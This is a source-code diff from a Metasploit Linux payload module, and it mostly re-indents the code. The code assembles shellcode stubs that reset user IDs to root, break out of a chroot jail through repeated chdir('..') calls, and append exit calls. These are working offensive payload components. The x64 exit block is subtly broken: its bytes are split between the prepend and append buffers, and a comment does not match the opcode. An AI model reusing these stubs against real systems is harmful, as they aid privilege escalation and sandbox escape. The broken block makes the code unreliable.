@@ -141,14 +141,13 @@ module Msf::Payload::Linux
 
 			end
 
-			# Append
+			# Append exit(0)
 
 			if (datastore['AppendExit'])
-				# exit(0)
 				app << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
-				       "\x6a\x01"             +#   pushl   $0x01                      #
-				       "\x58"                 +#   popl    %eax                       #
-				       "\xcd\x80"              #   int     $0x80                      #
+					"\x6a\x01"             +#   pushl   $0x01                      #
+					"\x58"                 +#   popl    %eax                       #
+					"\xcd\x80"              #   int     $0x80                      #
 			end
 
 		end
@@ -196,10 +195,9 @@ module Msf::Payload::Linux
 				# EEK! unsupported...
 			end
 
-			# Append
+			# Append exit(0)
 
 			if (datastore['AppendExit'])
-				# exit(0)
 				app << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
 				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
 				       "\x38\x1f\xfe\x02"     +#   addi    r0,r31,-510                #
@@ -211,93 +209,89 @@ module Msf::Payload::Linux
 
 			if (datastore['PrependSetresuid'])
 				# setresuid(0, 0, 0)
-                                pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
-                                pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
-                                pre << "\x6a\x75"             #    push    0x75                      #
-                                pre << "\x58"                 #    pop     rax                       #
-                                pre << "\x0f\x05"             #    syscall                           #
-
-                        end
+				pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
+				pre << "\x6a\x75"             #    push    0x75                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
+			end
 
 			if (datastore['PrependSetreuid'])
 				# setreuid(0, 0)
-                                pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
-                                pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
-                                pre << "\x48\x89\xf2"         #    mov     rdx,rsi                   #
-                                pre << "\x6a\x71"             #    push    0x71                      #
-                                pre << "\x58"                 #    pop     rax                       #
-                                pre << "\x0f\x05"             #    syscall                           #
-
-                        end
+				pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
+				pre << "\x48\x89\xf2"         #    mov     rdx,rsi                   #
+				pre << "\x6a\x71"             #    push    0x71                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
+			end
 
 			if (datastore['PrependSetuid'])
 				# setuid(0)
-                                pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
-                                pre << "\x6a\x69"             #    push    0x69                      #
-                                pre << "\x58"                 #    pop     rax                       #
-                                pre << "\x0f\x05"             #    syscall                           #
-                        end
+				pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x6a\x69"             #    push    0x69                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
+			end
 
 			if (datastore['PrependChrootBreak'])
 
 				# setreuid(0, 0)
-                                pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
-                                pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
-                                pre << "\x48\x89\xf8"         #    mov     rax,rdi                   #
-                                pre << "\xb0\x71"             #    mov     al,0x71                   #
-                                pre << "\x0f\x05"             #    syscall                           #
+				pre << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x48\x89\xfe"         #    mov     rsi,rdi                   #
+				pre << "\x48\x89\xf8"         #    mov     rax,rdi                   #
+				pre << "\xb0\x71"             #    mov     al,0x71                   #
+				pre << "\x0f\x05"             #    syscall                           #
 
-                                # generate temp dir name
-                                pre << "\x48\xbf"             #    mov     rdi,                      #
-                                pre << Rex::Text.rand_text_alpha(8)  #         random                #
-                                pre << "\x56"                 #    push    rsi                       #
-                                pre << "\x57"                 #    push    rdi                       #
+				# generate temp dir name
+				pre << "\x48\xbf"             #    mov     rdi,                      #
+				pre << Rex::Text.rand_text_alpha(8)  #         random                #
+				pre << "\x56"                 #    push    rsi                       #
+				pre << "\x57"                 #    push    rdi                       #
 
-                                # mkdir(random,0755)
-                                pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
-                                pre << "\x66\xbe\xed\x01"     #    mov     si,0755                   #
-                                pre << "\x6a\x53"             #    push    0x53                      #
-                                pre << "\x58"                 #    pop     rax                       #
-                                pre << "\x0f\x05"             #    syscall                           #
+				# mkdir(random,0755)
+				pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
+				pre << "\x66\xbe\xed\x01"     #    mov     si,0755                   #
+				pre << "\x6a\x53"             #    push    0x53                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
 
-                                # chroot(random)
-                                pre << "\x48\x31\xd2"         #    xor     rdx,rdx                   #
-                                pre << "\xb2\xa1"             #    mov     dl,0xa1                   #
-                                pre << "\x48\x89\xd0"         #    mov     rax,rdx                   #
-                                pre << "\x0f\x05"             #    syscall                           #
+				# chroot(random)
+				pre << "\x48\x31\xd2"         #    xor     rdx,rdx                   #
+				pre << "\xb2\xa1"             #    mov     dl,0xa1                   #
+				pre << "\x48\x89\xd0"         #    mov     rax,rdx                   #
+				pre << "\x0f\x05"             #    syscall                           #
 
-                                # build .. (ptr in rdi )
-                                pre << "\x66\xbe\x2e\x2e"     #    mov     si,0x2e2e                 #
-                                pre << "\x56"                 #    push    rsi                       #
-                                pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
+				# build .. (ptr in rdi )
+				pre << "\x66\xbe\x2e\x2e"     #    mov     si,0x2e2e                 #
+				pre << "\x56"                 #    push    rsi                       #
+				pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
 
-                                # loop chdir(..) 69 times
-                                # syscall tendo to modify rcx can't use loop...
-                                pre << "\x6a\x45"             #    push    0x45                      #
-                                pre << "\x5b"                 #    pop     rbx                       #
-                                pre << "\x6a\x50"             #    push    0x50                      #
-                                pre << "\x58"                 #    pop     rax                       #
-                                pre << "\x0f\x05"             #    syscall                           #
-                                pre << "\xfe\xcb"             #    dec     bl                        #
-                                pre << "\x75\xf7"             #    jnz     -7                        #
+				# loop chdir(..) 69 times
+				# syscall tendo to modify rcx can't use loop...
+				pre << "\x6a\x45"             #    push    0x45                      #
+				pre << "\x5b"                 #    pop     rbx                       #
+				pre << "\x6a\x50"             #    push    0x50                      #
+				pre << "\x58"                 #    pop     rax                       #
+				pre << "\x0f\x05"             #    syscall                           #
+				pre << "\xfe\xcb"             #    dec     bl                        #
+				pre << "\x75\xf7"             #    jnz     -7                        #
 
-                                # chrot (.) (witch should by /)
-                                pre << "\x6a\x2e"             #    push    .  (0x2e)                 #
-                                pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
-                                pre << "\x48\x89\xd0"         #    mov     rax,rdx                   #
-                                pre << "\x0f\x05"             #    syscall                           #
+				# chrot (.) (witch should by /)
+				pre << "\x6a\x2e"             #    push    .  (0x2e)                 #
+				pre << "\x48\x89\xe7"         #    mov     rdi,rsp                   #
+				pre << "\x48\x89\xd0"         #    mov     rax,rdx                   #
+				pre << "\x0f\x05"             #    syscall                           #
 
-                        end
+			end
 
-			# Append
-
-				# exit(0)
+			# Append exit(0)
 			if (datastore['AppendExit'])
-                                app << "\x48\x31\xff"         #    xor     rdi,rdi                   #
-                                pre << "\x6a\x3c"             #    push    0x53                      #
-                                pre << "\x58"                 #    pop     rax                       #
-                                app << "\x0f\x05"             #    syscall                           #
-                        end
+				app << "\x48\x31\xff"         #    xor     rdi,rdi                   #
+				pre << "\x6a\x3c"             #    push    0x53                      #
+				pre << "\x58"                 #    pop     rax                       #
+				app << "\x0f\x05"             #    syscall                           #
+			end
 		end
 
 		return (pre + buf + app)
